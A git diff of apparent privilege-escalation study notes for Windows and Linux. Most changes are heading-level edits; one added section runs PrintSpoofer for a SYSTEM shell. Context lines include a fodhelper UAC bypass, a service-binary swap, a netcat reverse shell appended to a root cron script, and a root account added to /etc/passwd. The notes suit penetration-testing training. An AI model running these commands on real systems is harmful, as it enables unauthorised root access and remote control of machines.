@@ -1,25 +1,25 @@
 ### Windows
-##### Processes(Windows can't list processes run by privileged users)
+###### Processes(Windows can't list processes run by privileged users)
 tasklist /svc
 ###### Powershell history
 ```
 (Get-PSReadlineOption).HistorySavePath
 ```
-##### Firewall
+###### Firewall
 netsh advfirewall show currentprofile  
 netsh advfirewall show allprofile  
 netsh advfirewall firewall show rule name=all
-##### Scheduled Tasks
+###### Scheduled Tasks
 schtasks /query /fo LIST /v
-##### Enumerating Unmounted Disks
+###### Enumerating Unmounted Disks
 mountvol
-##### Enumerating Device Drivers and Kernel Modules
+###### Enumerating Device Drivers and Kernel Modules
 1. driverquery /v /FO Table  
 2. Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer
-##### Enumerating Binaries That AutoElevate
+###### Enumerating Binaries That AutoElevate
 reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer  
 reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
-##### Bypass UAC
+###### Bypass UAC
 ```
 1. check C:\Windows\System32\fodhelper.exe
 2. REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
@@ -34,7 +34,7 @@ set session 1
 set target 1(x64,0=x86)
 Note to set payload the same arch with session 1's payload，set lhost and lport same with session 1
 ```
-##### Insecure File Permissions
+###### Insecure File Permissions
 ```
 1. Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'} # look for services with path in Program Files
 2. icacls "service path"
@@ -42,7 +42,7 @@ Note to set payload the same arch with session 1's payload，set lhost and lport
 4. Get-WmiObject -Class Win32_Service -Property StartMode -Filter "Name='Service Name'"
 5. whoami /priv #check out shutdown privileges of user
 ```
-##### Unquoted Service Paths
+###### Unquoted Service Paths
 Print service and path not in C:\Windows Path
 ```
 wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
@@ -168,9 +168,15 @@ iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe
 move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
 move .\BackendCacheCleanup.exe .\Pictures\
 ```
+###### Named Pipe
+```
+kali: iwr -uri http://192.168.45.214/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
+victim: .\PrintSpoofer64.exe -i -c powershell.exe(cmd.exe)\
+whoami
+```
 
 ### Linux
-##### Kernel exploits
+###### Kernel exploits
 ```
 OS version:
 cat /etc/issue  
@@ -178,22 +184,22 @@ cat /etc/*-release
 Kernel Version and Architecture: 
 uname -a
 ```
-##### Processes(Linux can list processes run by privileged users)
+###### Processes(Linux can list processes run by privileged users)
 ps aux
-##### Enumerating Readable/Writable Files and Directories
+###### Enumerating Readable/Writable Files and Directories
 find / -writable(-readable,-executable) -type d(f) 2>/dev/null  
-##### Enumerating Unmounted Disks
+###### Enumerating Unmounted Disks
 mount  
 lsblk
-##### Enumerating Device Drivers and Kernel Modules
+###### Enumerating Device Drivers and Kernel Modules
 1. lsmod  
 2. /sbin/modinfo libata
-##### Enumerating Binaries That AutoElevate
+###### Enumerating Binaries That AutoElevate
 >Normally, when running an executable, it inherits the permissions of the user that runs it. However, if the SUID permissions are set, the binary will run with the permissions of the file owner. This means that if a binary has the SUID bit set and the file is owned by root, any local user will be able to execute that binary with elevated privileges
  ```
  find / -perm -u=s -type f 2>/dev/null
  ```
- ##### Cronjob to elevate privilege
+ ###### Cronjob to elevate privilege
  ```
  1. grep "CRON" /var/log/cron.log
 Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
@@ -202,7 +208,7 @@ Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd /var/scripts/ && ./user_backups.
 3. echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh
 4. nc -lnvp 1234
  ```
- ##### Insecure file permission /etc/passwd
+ ###### Insecure file permission /etc/passwd
  ```
  1. check if users have write permission
  2. openssl passwd evil:
@@ -211,7 +217,7 @@ Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd /var/scripts/ && ./user_backups.
  3. echo "root2:$1$eWmYOQrX$UHeqHr4pKVFfx1rrFK05B1:0:0:root:/root:/bin/bash" >> /etc/passwd
  4. su root2, enter passwd as evil
  ```
-  ##### Insecure file permission /usr/bin/vim.basic
+  ###### Insecure file permission /usr/bin/vim.basic
   ```
   vim.basic basically can view any file with root permission if it has suid set, also it can edit /etc/passwd
   ```
